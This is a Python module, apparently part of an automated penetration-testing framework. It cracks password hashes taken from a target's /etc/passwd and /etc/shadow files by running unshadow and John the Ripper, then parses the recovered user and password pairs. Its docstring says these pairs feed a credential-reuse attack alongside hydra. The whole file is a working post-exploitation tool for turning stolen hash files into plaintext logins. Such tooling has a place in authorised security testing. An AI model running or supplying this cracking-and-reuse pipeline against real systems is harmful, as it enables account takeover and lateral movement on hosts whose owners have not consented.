"""Local password cracking.

Once post-exploitation has read /etc/passwd and /etc/shadow (read-only), this
tool recovers plaintext passwords from the weak hashes with John the Ripper.
It runs entirely on the control host against data we already hold — it never
touches the target, writes nothing to it, and stays non-destructive. The point
is to feed the credential-reuse step with passwords hydra's small wordlist does
not contain. Bounded by a wordlist and a time limit.
"""

import os
import shutil
import subprocess
import tempfile

WORDLIST = "/usr/share/john/password.lst"


def _parse_show(show_output):
    """Parse `john --show` output. Each cracked account is printed as a passwd
    line with the password in field 2: 'user:password:uid:gid:...'. The trailing
    summary line ('N password hashes cracked, M left') is skipped."""
    pairs = []
    seen = set()
    for line in show_output.splitlines():
        line = line.strip()
        if not line or "password hash" in line:
            continue
        parts = line.split(":")
        if len(parts) >= 2 and parts[0] and parts[1]:
            user, password = parts[0], parts[1]
            key = (user, password)
            if key not in seen:
                seen.add(key)
                pairs.append({"source": "shadow", "user": user, "password": password})
    return pairs


def crack_hashes(passwd_text, shadow_text, timeout=60, wordlist=WORDLIST):
    """Return a list of {"source","user","password"} for cracked accounts.
    Returns [] if inputs are empty, john is missing, or nothing cracked."""
    if not passwd_text or not shadow_text:
        return []
    if shutil.which("unshadow") is None or shutil.which("john") is None:
        return []

    workdir = tempfile.mkdtemp(prefix="ultron_crack_")
    passwd_path = os.path.join(workdir, "passwd")
    shadow_path = os.path.join(workdir, "shadow")
    combined_path = os.path.join(workdir, "combined")
    pot_path = os.path.join(workdir, "john.pot")
    try:
        with open(passwd_path, "w") as f:
            f.write(passwd_text if passwd_text.endswith("\n") else passwd_text + "\n")
        with open(shadow_path, "w") as f:
            f.write(shadow_text if shadow_text.endswith("\n") else shadow_text + "\n")

        combined = subprocess.run(
            ["unshadow", passwd_path, shadow_path],
            capture_output=True, text=True, timeout=30,
        )
        if not combined.stdout.strip():
            return []
        with open(combined_path, "w") as f:
            f.write(combined.stdout)

        john_cmd = ["john", f"--pot={pot_path}", f"--max-run-time={timeout}"]
        if wordlist and os.path.exists(wordlist):
            john_cmd.append(f"--wordlist={wordlist}")
        john_cmd.append(combined_path)
        try:
            subprocess.run(john_cmd, capture_output=True, text=True, timeout=timeout + 30)
        except subprocess.TimeoutExpired:
            pass  # whatever cracked so far is in the pot; we read it below

        show = subprocess.run(
            ["john", f"--pot={pot_path}", "--show", combined_path],
            capture_output=True, text=True, timeout=30,
        )
        return _parse_show(show.stdout)
    except subprocess.TimeoutExpired:
        return []
    finally:
        shutil.rmtree(workdir, ignore_errors=True)
